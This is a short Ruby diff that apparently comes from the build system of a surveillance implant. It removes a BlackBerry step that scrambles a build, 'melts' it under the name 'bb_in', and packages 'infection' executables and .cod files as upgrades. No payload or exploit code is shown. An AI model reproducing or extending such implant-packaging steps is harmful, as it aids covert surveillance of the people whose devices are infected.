@@ -249,20 +249,6 @@ class Item
               add_upgrade(f[:name], f[:path])
             end
             build.clean
-
-            build = RCS::DB::Build.factory(:blackberry)
-            build.load({'_id' => factory._id})
-            build.unpack
-            build.patch({'demo' => self.demo})
-            build.scramble
-            build.melt({'appname' => 'bb_in'})
-            add_upgrade('javaloader.exe', File.join(build.tmpdir, 'infection/jlz.exe'))
-            add_upgrade('bb_in.exe', File.join(build.tmpdir, 'infection/bb_in.exe'))
-            add_upgrade('bb_in.jad', File.join(build.tmpdir, 'bb_in.jad'))
-            add_upgrade('bb_in.cod', File.join(build.tmpdir, 'bb_in.cod'))
-            add_upgrade('bb_in-1.cod', File.join(build.tmpdir, 'bb_in-1.cod'))
-            add_upgrade('bb_in_base.cod', File.join(build.tmpdir, 'bb_in_base.cod'))
-            build.clean
           end
 
         end
